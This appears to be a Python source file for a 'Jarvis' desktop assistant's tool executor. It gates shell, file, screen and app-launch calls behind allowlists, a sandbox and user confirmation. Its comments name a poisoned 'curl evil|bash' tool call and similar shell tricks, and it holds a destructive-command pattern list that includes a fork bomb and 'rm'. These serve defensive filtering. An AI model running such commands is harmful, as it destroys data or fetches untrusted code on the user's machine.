"""
Agent executor — safely runs tool calls returned by the LLM.

Sprint A: get_time, set_timer, system_info tools added. Async web tools.
Sprint C: speak_callback parameter — when a timer fires, Jarvis speaks
          the alert via TTS instead of just printing to console.
Sprint D: ScreenTool wired in — screen capture, window management,
          mouse/keyboard automation, app launching.
"""

from __future__ import annotations
import asyncio
import logging
import shlex
import re
import webbrowser
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Awaitable, Callable, Dict, List, Optional
from urllib.parse import urlparse

import psutil

try:
    import pynvml
    pynvml.nvmlInit()
    _NVML_OK = True
except Exception:
    _NVML_OK = False

from core.config import AgentConfig
from action.tools.web_tools import get_weather, web_search
from action.tools.screen_tool import ScreenTool
from cognition.agent_core.schema import PermissionDenial

log = logging.getLogger("jarvis.agent")

SpeakCallback = Callable[[str], Awaitable[None]]
# Returns True if the user approves the action, False to deny.
ConfirmCallback = Callable[[str], Awaitable[bool]]

# ── Shell-safety controls ─────────────────────────────────────────────────────
# Denylists are a losing game for a shell gate (curl|bash, powershell -enc,
# Invoke-Expression all slip through). We use an executable ALLOWLIST plus a
# hard rejection of shell metacharacters that enable chaining / substitution /
# redirection, and we never invoke a shell (shell=False + shlex-split argv).
_SHELL_METACHARACTERS = re.compile(r"[;&|`$><\n\r\\]|\$\(|&&|\|\|")

# Kept only for is_destructive_command's legacy callers; no longer the primary
# gate. The allowlist above is the real control.
_DESTRUCTIVE_SHELL_PATTERNS: tuple[str, ...] = (
    "rm ", "del ", "rd ", "format ", "mkfs",
    ":(){:|:&};:", "DROP ", "DELETE ",
    "shutdown", "reboot", "halt", "poweroff",
)

# URL schemes open_url is permitted to hand to the browser. Blocks file://,
# javascript:, data:, etc. which are exfiltration / local-code vectors.
_ALLOWED_URL_SCHEMES = frozenset({"http", "https"})

# Screen tools that require explicit confirmation before firing
_SCREEN_CONFIRM_TOOLS = frozenset({
    "close_app",
    "close_window",
})


@dataclass(frozen=True)
class ToolPermissionContext:
    deny_names: frozenset[str] = field(default_factory=frozenset)
    deny_prefixes: tuple[str, ...] = field(default_factory=tuple)
    shell_allowlist: frozenset[str] = field(default_factory=frozenset)

    def blocks(self, tool_name: str) -> bool:
        return tool_name.lower() in self.deny_names

    def is_destructive_command(self, command: str) -> bool:
        lowered = command.lower().strip()
        return any(
            lowered.startswith(p.lower()) or p.lower() in lowered
            for p in self.deny_prefixes
        )

    def check_shell_command(self, command: str) -> Optional[str]:
        """
        Validate a shell command against the safety policy.
        Returns None if the command is permitted, or a human-readable denial
        reason string if it must be blocked.

        Policy (allowlist, not denylist):
          1. Reject shell metacharacters (chaining / substitution / redirection).
          2. The command must tokenize cleanly (no unbalanced quotes).
          3. The first token (the executable) must be in the allowlist.
        """
        cmd = command.strip()
        if not cmd:
            return "empty command"
        if _SHELL_METACHARACTERS.search(cmd):
            return "command contains shell metacharacters (chaining/redirection is not allowed)"
        try:
            tokens = shlex.split(cmd, posix=False)
        except ValueError as e:
            return f"command could not be parsed safely ({e})"
        if not tokens:
            return "no executable found"
        exe = tokens[0].lower().strip('"').rsplit("\\", 1)[-1].rsplit("/", 1)[-1]
        exe = exe[:-4] if exe.endswith(".exe") else exe
        if exe not in self.shell_allowlist:
            return f"executable '{exe}' is not in the shell allowlist"
        return None

    @classmethod
    def from_agent_config(cls, config: AgentConfig) -> "ToolPermissionContext":
        denied: list[str] = []
        if not config.shell_enabled:
            denied.append("run_shell")
        if not config.file_enabled:
            denied.extend(["read_file", "write_file", "list_directory"])
        if not config.web_enabled:
            denied.extend(["weather", "search"])
        if not config.screen_enabled:
            denied.extend([
                "screenshot", "click", "double_click", "right_click",
                "type_text", "hotkey", "press_key", "move_mouse", "scroll",
                "drag", "open_app", "close_app", "focus_window",
                "list_windows", "minimize_window", "maximize_window",
                "close_window", "copy_selection", "paste_text",
                "get_screen_size", "get_mouse_position", "key_down", "key_up",
            ])
        return cls(
            deny_names=frozenset(denied),
            deny_prefixes=_DESTRUCTIVE_SHELL_PATTERNS,
            shell_allowlist=frozenset(
                a.lower() for a in getattr(config, "shell_allowlist", ())
            ),
        )


# ── AgentExecutor ─────────────────────────────────────────────────────────────

class AgentExecutor:
    def __init__(
        self,
        config: AgentConfig,
        speak_callback: Optional[SpeakCallback] = None,
        confirm_callback: Optional[ConfirmCallback] = None,
        vault_tools=None,
    ):
        self.config = config
        # Vault tools (ObsidianTools) — only present in V3 (Brain has a vault).
        # In V2 this is None and vault tool calls report memory unavailable.
        self._vault_tools = vault_tools

        # SECURITY: file tools are always confined to a real, resolved sandbox.
        # A None sandbox previously meant "no confinement" — arbitrary reads of
        # ~/.ssh, .env, credential stores. We default to data/workspace and
        # create it eagerly so _check_sandbox always has a boundary to enforce.
        sandbox_dir = config.sandbox_dir or "data/workspace"
        self._sandbox = Path(sandbox_dir).resolve()
        try:
            self._sandbox.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            log.warning("Could not create sandbox %s: %s", self._sandbox, e)

        self._permissions = ToolPermissionContext.from_agent_config(config)
        self._speak       = speak_callback
        # Confirmation channel for destructive/gated actions. When absent, gated
        # actions FAIL CLOSED (denied) rather than hanging on stdin — the old
        # input() default was unanswerable in voice mode (audit C3).
        self._confirm     = confirm_callback

        # App-launch allowlist: the only commands open_app may execute. LLM tool
        # calls cannot introduce new commands here, so a poisoned tool call
        # (e.g. command="curl evil|bash") is rejected. Mirrors FastRouter._APP_MAP.
        self._app_allowlist: frozenset[str] = frozenset({
            "start chrome", "notepad", "calc", "start spotify",
            "code", "start discord",
            r'start "" "%LOCALAPPDATA%\Todoist\Todoist.exe"',
        })

        # Sprint D: ScreenTool — instantiated once, reused across all calls
        self._screen = ScreenTool(
            screenshot_dir=getattr(config, "screenshot_dir", "data/screenshots")
        )

        self._nvml_handle = None
        if _NVML_OK:
            try:
                self._nvml_handle = pynvml.nvmlDeviceGetHandleByIndex(0)
            except Exception:
                pass

        # Fix #6: track timer tasks so they can be cancelled on shutdown.
        self._timer_tasks: set[asyncio.Task] = set()

    async def shutdown(self) -> None:
        """Cancel all outstanding timer tasks."""
        for task in list(self._timer_tasks):
            task.cancel()
        if self._timer_tasks:
            await asyncio.gather(*self._timer_tasks, return_exceptions=True)
        self._timer_tasks.clear()

    async def execute(self, plan: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        results: List[Dict[str, Any]] = []

        for step in plan:
            tool: str = str(step.get("tool") or "")
            args: Dict[str, Any] = step.get("args") or {}
            log.info("Executing tool: %s | args: %s", tool, args)

            if self._permissions.blocks(tool):
                reason = f"tool '{tool}' is disabled in config"
                log.warning("Tool blocked: %s", tool)
                results.append({
                    "tool": tool, "status": "denied", "reason": reason,
                    "denial": PermissionDenial(tool_name=tool, reason=reason),
                })
                continue

            if self.config.confirmation_required and self._requires_confirmation(tool, args):
                confirmed = await self._prompt_confirm(tool, args)
                if not confirmed:
                    reason = "user declined confirmation"
                    results.append({
                        "tool": tool, "status": "denied", "reason": reason,
                        "denial": PermissionDenial(tool_name=tool, reason=reason),
                    })
                    continue

            try:
                result = await self._dispatch(tool, args)
                results.append({"tool": tool, "status": "ok", "result": result})
            except Exception as e:
                log.error("Tool %s failed: %s", tool, e)
                results.append({"tool": tool, "status": "error", "error": str(e)})

        return results

    # ── Dispatch ──────────────────────────────────────────────────────────────

    async def _dispatch(self, tool: str, args: Dict[str, Any]) -> Any:

        # ── Existing tools (unchanged) ─────────────────────────────────────
        if tool == "get_time":
            return self._get_time()

        elif tool == "set_timer":
            duration = int(args.get("duration_seconds") or 60)
            label    = str(args.get("label") or "Timer")
            return await self._set_timer(duration, label)

        elif tool == "system_info":
            return self._system_info()

        elif tool == "run_shell":
            return await self._run_shell(str(args.get("command") or ""))

        elif tool == "read_file":
            return self._read_file(str(args.get("path") or ""))

        elif tool == "write_file":
            return self._write_file(
                str(args.get("path") or ""),
                str(args.get("content") or ""),
                str(args.get("mode") or "w"),
            )

        elif tool == "list_directory":
            return self._list_dir(str(args.get("path") or ""))

        elif tool == "weather":
            return await get_weather(str(args.get("city") or "bangalore"))

        elif tool == "search":
            return await web_search(str(args.get("query") or ""))

        # ── Sprint D: Screen tools ─────────────────────────────────────────

        elif tool == "screenshot":
            # region: optional [left, top, width, height]
            region = args.get("region")
            if isinstance(region, list) and len(region) == 4:
                region = tuple(region)
            else:
                region = None
            return await self._screen.screenshot(region=region)

        elif tool == "click":
            return await self._screen.click(
                x=args.get("x"),
                y=args.get("y"),
                button=str(args.get("button", "left")),
                clicks=int(args.get("clicks", 1)),
            )

        elif tool == "double_click":
            return await self._screen.double_click(
                int(args.get("x", 0)), int(args.get("y", 0))
            )

        elif tool == "right_click":
            return await self._screen.right_click(
                int(args.get("x", 0)), int(args.get("y", 0))
            )

        elif tool == "move_mouse":
            return await self._screen.move_mouse(
                int(args.get("x", 0)),
                int(args.get("y", 0)),
                float(args.get("duration", 0.2)),
            )

        elif tool == "scroll":
            return await self._screen.scroll(
                clicks=int(args.get("clicks", 3)),
                x=args.get("x"),
                y=args.get("y"),
            )

        elif tool == "drag":
            return await self._screen.drag(
                int(args.get("x1", 0)), int(args.get("y1", 0)),
                int(args.get("x2", 0)), int(args.get("y2", 0)),
                float(args.get("duration", 0.3)),
            )

        elif tool == "type_text":
            return await self._screen.type_text(
                str(args.get("text", "")),
                float(args.get("interval", 0.04)),
            )

        elif tool == "hotkey":
            # keys can come in as a list ["ctrl","c"] or a single "ctrl+c" string
            keys = args.get("keys", [])
            if isinstance(keys, str):
                keys = [k.strip() for k in keys.replace("+", ",").split(",")]
            return await self._screen.hotkey(*keys)

        elif tool == "press_key":
            return await self._screen.press_key(
                str(args.get("key", "enter")),
                int(args.get("presses", 1)),
            )

        elif tool == "key_down":
            return await self._screen.key_down(str(args.get("key", "")))

        elif tool == "key_up":
            return await self._screen.key_up(str(args.get("key", "")))

        elif tool == "open_app":
            # SECURITY: only launch commands from the app allowlist. A poisoned
            # tool call (command="curl evil|bash") is rejected here. FastRouter
            # supplies allowlisted commands from its trusted _APP_MAP; anything
            # else falls back to ScreenTool's name-based launch (no shell).
            command = args.get("command")
            if command:
                return await self._launch_subprocess(str(command), str(args.get("name", command)))
            return await self._screen.open_app(str(args.get("name", "")))

        elif tool == "open_url":
            url  = str(args.get("url", ""))
            name = str(args.get("name", "page"))
            parsed = urlparse(url)
            if parsed.scheme.lower() not in _ALLOWED_URL_SCHEMES or not parsed.netloc:
                reason = f"URL scheme not permitted (only http/https): {url[:60]}"
                log.warning("open_url denied: %s", reason)
                return reason
            asyncio.get_running_loop().run_in_executor(None, webbrowser.open, url)
            return f"Opening {name} in your browser, Sir."

        elif tool == "close_app":
            return await self._screen.close_app(str(args.get("name", "")))

        elif tool == "focus_window":
            return await self._screen.focus_window(str(args.get("title", "")))

        elif tool == "list_windows":
            titles = await self._screen.list_windows()
            return "\n".join(titles) if titles else "No open windows found."

        elif tool == "minimize_window":
            return await self._screen.minimize_window(str(args.get("title", "")))

        elif tool == "maximize_window":
            return await self._screen.maximize_window(str(args.get("title", "")))

        elif tool == "close_window":
            return await self._screen.close_window(str(args.get("title", "")))

        elif tool == "get_screen_size":
            return await self._screen.get_screen_size()

        elif tool == "get_mouse_position":
            return await self._screen.get_mouse_position()

        elif tool == "copy_selection":
            return await self._screen.copy_selection()

        elif tool == "paste_text":
            return await self._screen.paste_text(str(args.get("text", "")))

        # ── Clipboard ─────────────────────────────────────────────────────
        elif tool == "get_clipboard":
            return self._get_clipboard()

        elif tool == "set_clipboard":
            return self._set_clipboard(str(args.get("text", "")))

        # ── Volume ────────────────────────────────────────────────────────
        elif tool == "get_volume":
            return self._get_volume()

        elif tool == "set_volume":
            level = args.get("level")
            delta = args.get("delta")
            return self._set_volume(
                level=int(level) if level is not None else None,
                delta=int(delta) if delta is not None else None,
            )

        elif tool == "mute_volume":
            return self._set_mute(True)

        elif tool == "unmute_volume":
            return self._set_mute(False)

        # ── Vault / Obsidian (V3) ─────────────────────────────────────────
        elif tool in (
            "create_note", "append_to_daily_note", "search_vault",
            "link_notes", "complete_task", "list_today",
        ):
            if self._vault_tools is None:
                return "My vault memory isn't available in this mode, Sir."
            return await self._dispatch_vault(tool, args)

        else:
            raise ValueError(f"Unknown tool: {tool}")

    async def _dispatch_vault(self, tool: str, args: Dict[str, Any]) -> Any:
        vt = self._vault_tools
        if tool == "create_note":
            return vt.create_note(
                str(args.get("title", "")),
                str(args.get("body", "")),
                args.get("tags"),
            )
        if tool == "append_to_daily_note":
            return vt.append_to_daily_note(str(args.get("text", "")))
        if tool == "search_vault":
            return await vt.search_vault(str(args.get("query", "")))
        if tool == "link_notes":
            return vt.link_notes(str(args.get("src", "")), str(args.get("dst", "")))
        if tool == "complete_task":
            return vt.complete_task(str(args.get("text", "")))
        if tool == "list_today":
            return vt.list_today(str(args.get("date", "")))
        raise ValueError(f"Unknown vault tool: {tool}")

    # ── Tool implementations (unchanged from original) ────────────────────────

    def _get_time(self) -> str:
        return datetime.now().strftime("%A, %B %d %Y — %I:%M %p")

    async def _set_timer(self, duration_seconds: int, label: str) -> str:
        speak = self._speak

        async def _fire():
            await asyncio.sleep(duration_seconds)
            alert = f"Sir, your {label} timer is complete."
            print(
                f"\n{'='*52}\n  [TIMER] JARVIS -- {label.upper()}\n{'='*52}\n",
                flush=True,
            )
            if speak:
                try:
                    await speak(alert)
                except Exception as e:
                    log.warning("Timer TTS failed: %s", e)

        task = asyncio.create_task(_fire())
        self._timer_tasks.add(task)
        task.add_done_callback(self._timer_tasks.discard)

        mins, secs = divmod(duration_seconds, 60)
        hours, mins = divmod(mins, 60)
        if hours:
            readable = f"{hours}h {mins}m {secs}s"
        elif mins:
            readable = f"{mins} minute{'s' if mins != 1 else ''}" + (f" {secs}s" if secs else "")
        else:
            readable = f"{secs} second{'s' if secs != 1 else ''}"

        return f"Timer '{label}' set for {readable}."

    def _system_info(self) -> str:
        vm  = psutil.virtual_memory()
        cpu = psutil.cpu_percent(interval=0.5)

        lines = [
            f"CPU at {cpu:.0f}%",
            f"RAM {vm.used/1e9:.1f} of {vm.total/1e9:.1f} GB ({vm.percent:.0f}%)",
        ]

        if self._nvml_handle:
            try:
                mem  = pynvml.nvmlDeviceGetMemoryInfo(self._nvml_handle)
                util = pynvml.nvmlDeviceGetUtilizationRates(self._nvml_handle)
                lines.append(
                    f"GPU at {util.gpu:.0f}% — "
                    f"VRAM {mem.used/1e9:.1f} of {mem.total/1e9:.1f} GB "
                    f"({mem.used/mem.total*100:.0f}%)"
                )
            except Exception:
                lines.append("GPU stats unavailable.")
        else:
            lines.append("No NVIDIA GPU detected.")

        boot   = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot
        uh, rem = divmod(int(uptime.total_seconds()), 3600)
        um = rem // 60
        lines.append(f"System uptime {uh}h {um}m.")

        return " | ".join(lines)

    async def _run_shell(self, command: str) -> Dict[str, Any]:
        # SECURITY: validate against the allowlist + metacharacter policy, then
        # execute with shell=False and an explicit argv (no shell interpolation,
        # no chaining). Working directory is pinned to the sandbox via cwd=,
        # not a `cd &&` prefix (which a metacharacter could have escaped).
        denial = self._permissions.check_shell_command(command)
        if denial is not None:
            log.warning("run_shell denied: %s | command=%r", denial, command[:120])
            return {"returncode": -1, "stdout": "", "stderr": f"Denied: {denial}"}

        argv = shlex.split(command, posix=False)
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=str(self._sandbox),
            )
        except FileNotFoundError:
            return {"returncode": -1, "stdout": "", "stderr": f"Executable not found: {argv[0]}"}

        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30.0)
        except asyncio.TimeoutError:
            proc.kill()
            return {"returncode": -1, "stdout": "", "stderr": "Command timed out after 30s"}

        return {
            "returncode": proc.returncode,
            "stdout": stdout.decode("utf-8", errors="replace")[:4000],
            "stderr": stderr.decode("utf-8", errors="replace")[:1000],
        }

    def _read_file(self, path: str) -> str:
        p = Path(path)
        self._check_sandbox(p)
        return p.read_text(encoding="utf-8", errors="replace")[:8000]

    def _write_file(self, path: str, content: str, mode: str = "w") -> str:
        p = Path(path)
        self._check_sandbox(p)
        p.parent.mkdir(parents=True, exist_ok=True)
        with p.open(mode, encoding="utf-8") as f:
            f.write(content)
        return f"Written {len(content)} chars to {path}."

    def _list_dir(self, path: str) -> List[str]:
        p = Path(path)
        self._check_sandbox(p)
        return [str(x) for x in sorted(p.iterdir())][:100]

    async def _launch_subprocess(self, command: str, name: str) -> str:
        # SECURITY: only allowlisted launch commands run. These are trusted
        # constants from FastRouter._APP_MAP, so shell=True is acceptable *for
        # these specific strings only* (Windows `start`/env-var expansion needs
        # the shell). An LLM-supplied command outside the allowlist is refused.
        if command not in self._app_allowlist:
            reason = f"app command not in allowlist: {command[:80]}"
            log.warning("open_app denied: %s", reason)
            return f"I can't launch that, Sir. {reason}"
        import subprocess
        await asyncio.to_thread(lambda: subprocess.Popen(command, shell=True))
        return f"Opening {name}, Sir."


    # ── Clipboard ─────────────────────────────────────────────────────────────

    def _get_clipboard(self) -> str:
        import pyperclip
        text = pyperclip.paste()
        if not text:
            return "Clipboard is empty, Sir."
        preview = text[:300] + ("…" if len(text) > 300 else "")
        return f"Clipboard: {preview}"

    def _set_clipboard(self, text: str) -> str:
        import pyperclip
        pyperclip.copy(text)
        return "Copied to clipboard, Sir."

    # ── Volume ────────────────────────────────────────────────────────────────

    @staticmethod
    def _volume_interface():
        """Return a live IAudioEndpointVolume COM interface.

        Newer pycaw (2024+) exposes the endpoint volume directly on the device
        via `.EndpointVolume`; older versions require Activate()+cast. Support both.
        """
        from pycaw.pycaw import AudioUtilities
        devices = AudioUtilities.GetSpeakers()
        endpoint = getattr(devices, "EndpointVolume", None)
        if endpoint is not None:
            return endpoint
        # Legacy pycaw fallback
        from pycaw.pycaw import IAudioEndpointVolume
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        return cast(interface, POINTER(IAudioEndpointVolume))

    def _get_volume(self) -> str:
        vol = self._volume_interface()
        level = round(vol.GetMasterVolumeLevelScalar() * 100)
        muted = bool(vol.GetMute())
        return f"Volume is at {level}%" + (" (muted)" if muted else "") + ", Sir."

    def _set_volume(self, level: int | None = None, delta: int | None = None) -> str:
        vol = self._volume_interface()
        current = round(vol.GetMasterVolumeLevelScalar() * 100)
        if delta is not None:
            new_level = max(0, min(100, current + delta))
        elif level is not None:
            new_level = max(0, min(100, level))
        else:
            return "Please specify a volume level or delta, Sir."
        vol.SetMasterVolumeLevelScalar(new_level / 100.0, None)
        return f"Volume set to {new_level}%, Sir."

    def _set_mute(self, mute: bool) -> str:
        vol = self._volume_interface()
        vol.SetMute(1 if mute else 0, None)
        return ("Audio muted, Sir." if mute else "Audio unmuted, Sir.")

    def _check_sandbox(self, path: Path) -> None:
        # SECURITY: sandbox is always set (see __init__). Any path resolving
        # outside it — including via .. traversal or absolute paths — is denied.
        try:
            path.resolve().relative_to(self._sandbox)
        except ValueError:
            raise PermissionError(
                f"Path is outside the sandbox ({self._sandbox}). Access denied."
            )

    def _requires_confirmation(self, tool: str, args: Dict[str, Any]) -> bool:
        if tool == "write_file":
            return True
        if tool in _SCREEN_CONFIRM_TOOLS:
            return True
        # run_shell always confirms when enabled — the allowlist narrows *what*
        # can run, confirmation ensures the user still authorizes each execution.
        if tool == "run_shell":
            return True
        return False

    async def _prompt_confirm(self, tool: str, args: Dict[str, Any]) -> bool:
        """
        Ask the user to approve a gated action.

        Uses the injected confirm_callback (voice- or text-answerable, wired by
        Brain). If no channel is available, FAIL CLOSED (deny) rather than block
        on stdin — the previous input() default was unanswerable in voice mode.
        """
        prompt = f"About to run {tool}. Shall I proceed, Sir?"
        if self._confirm is None:
            log.warning(
                "Confirmation required for %s but no confirm channel wired — denying.", tool
            )
            return False
        try:
            return await self._confirm(prompt)
        except Exception as e:
            log.warning("Confirmation callback failed (%s) — denying.", e)
            return False